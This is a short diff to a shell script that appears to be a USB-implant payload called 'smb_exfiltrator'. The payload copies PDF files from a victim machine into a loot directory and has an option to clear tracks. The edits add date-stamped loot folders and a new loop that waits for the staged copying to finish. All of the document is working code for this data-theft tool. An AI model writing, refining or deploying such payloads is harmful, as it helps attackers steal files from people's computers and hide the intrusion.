@@ -21,7 +21,7 @@
 LOOTDIR=/root/udisk/loot/smb_exfiltrator
 EXFILTRATE_FILES="*.pdf"
 CLEARTRACKS="yes" # yes or no
-
+DATE=$(date +%Y%m%d_%H%M%S)
 # Initialization
 LED R G 100
 
@@ -96,19 +96,18 @@ last=0
 current=1
 while [ "$last" != "$current" ]; do
    last=$current
-   current=$(find /root/loot/smb_exfiltrator/temp/ -exec stat -c "%Y" \{\} \; | sort -n | tail -1)
+   current=$(ls -lR /root/loot/smb_exfiltrator/temp/ | sha1sum)
    LED B
    sleep 1
    LED R B 100
    sleep 9
    # Files are still being copied. Loop. 
-   # (Issue may exist if file takes longer than 10s to copy)
 done
 
 
 # Move files from staging area to loot directory
 LED R G B
-mv /root/loot/smb_exfiltrator/temp/* $LOOTDIR/$HOST-$COUNT
+mv /root/loot/smb_exfiltrator/temp/* $LOOTDIR/$HOST-$DATE
 sync; sleep 1; sync
 
 # Trap is clean
